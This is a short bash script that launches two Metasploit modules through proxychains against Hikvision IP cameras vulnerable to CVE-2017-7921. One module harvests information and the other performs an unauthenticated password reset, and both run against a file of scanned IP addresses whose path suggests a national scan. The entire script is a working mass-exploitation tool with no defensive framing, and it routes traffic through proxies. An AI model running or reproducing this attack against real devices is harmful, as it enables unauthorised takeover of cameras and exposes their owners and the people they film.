#!/bin/bash

proxychains4 msfconsole -q -x "use auxiliary/gather/hikvision_info_disclosure_cve_2017_7921; set RHOSTS file:///home/shimmyo/DATA/ip-scans/il/results/554/ips; set RPORT 80; run; exit" -o gather &
proxychains4 msfconsole -q -x "use auxiliary/admin/http/hikvision_unauth_pwd_reset_cve_2017_7921; set RHOSTS file:///home/shimmyo/DATA/ip-scans/il/results/554/ips; set RPORT 80; run; exit" -o unauth &

exit 0
